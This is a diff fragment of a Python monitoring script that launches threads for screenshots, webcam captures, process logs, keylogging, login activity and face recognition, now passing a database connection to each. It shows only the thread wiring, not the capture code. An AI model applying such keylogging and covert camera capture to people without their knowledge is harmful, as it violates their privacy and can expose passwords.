@@ -84,12 +84,12 @@ face_rec_int           = database_operations.db_read(con, "SELECT face_rec_int  
 
 
 #################### Creating and starting threads as per Config Table ####################
-screen_capture_thread         = threading.Thread(target=Screenshot    .start_data_capture, args=(screen_capture_int,))  if screen_capture         else None
-cam_capture_thread            = threading.Thread(target=Selfie        .start_data_capture, args=(cam_capture_int,))     if cam_capture            else None
-process_log_capture_thread    = threading.Thread(target=ProcessDP     .start_data_capture, args=(process_capture_int,)) if process_log_capture    else None
-key_log_capture_thread        = threading.Thread(target=KeyLogging    .start_data_capture)                              if key_log_capture        else None
-login_activity_capture_thread = threading.Thread(target=LoginActivity .start_data_capture)                              if login_activity_capture else None
-face_rec_thread               = threading.Thread(target=FaceRec       .start_face_rec, args=(face_rec_int,))            if face_rec               else None
+screen_capture_thread         = threading.Thread(target=Screenshot    .start_data_capture, args=(con, screen_capture_int,))  if screen_capture         else None
+cam_capture_thread            = threading.Thread(target=Selfie        .start_data_capture, args=(con, cam_capture_int,))     if cam_capture            else None
+process_log_capture_thread    = threading.Thread(target=ProcessDP     .start_data_capture, args=(con, process_capture_int,)) if process_log_capture    else None
+key_log_capture_thread        = threading.Thread(target=KeyLogging    .start_data_capture, args=(con,))                      if key_log_capture        else None
+login_activity_capture_thread = threading.Thread(target=LoginActivity .start_data_capture, args=(con,))                      if login_activity_capture else None
+face_rec_thread               = threading.Thread(target=FaceRec       .start_face_rec, args=(con, face_rec_int,))            if face_rec               else None
 
 screen_capture_thread         .start()
 cam_capture_thread            .start()
